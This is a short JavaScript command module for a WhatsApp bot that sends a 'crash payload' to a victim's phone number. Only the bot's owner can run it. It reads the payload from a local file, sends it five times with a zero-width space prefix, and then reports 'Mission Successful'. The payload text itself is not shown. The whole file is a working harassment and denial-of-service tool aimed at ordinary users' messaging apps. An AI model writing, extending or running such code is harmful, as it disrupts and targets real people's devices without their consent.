const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "skill",
    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
        if (!isOwner) return;
        let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const payload = fs.readFileSync('./lib/payloads/skill.text', 'utf-8');

        msg.reply(fancy("🥀 sending skill crash payload..."));

        for (let i = 0; i < 5; i++) {
            await conn.sendMessage(target, { text: "\u200B" + payload });
        }
        await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Successful: SKILL Crash sequence done.") });
    }
};
